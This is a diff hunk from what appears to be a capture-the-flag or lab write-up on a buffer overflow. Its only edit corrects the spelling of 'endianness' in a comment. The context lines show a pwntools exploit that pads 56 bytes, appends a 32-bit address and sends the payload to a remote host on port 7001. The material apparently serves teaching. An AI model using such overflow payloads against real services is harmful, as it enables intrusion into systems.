@@ -36,7 +36,7 @@ What this means is, if we enter 56 bytes, then the next 8 bytes will overwrite t
 		context.log_level = "critical"
 		payload = flat([
 			b"A"*56,
-			p32(0xdeadbeef) # simply enter the exact address, it will handle the endianess in its default values
+			p32(0xdeadbeef) # simply enter the exact address, it will handle the endianness in its default values
 			])
 		p = remote('10.21.232.38', 7001)
 		p.sendline(payload)
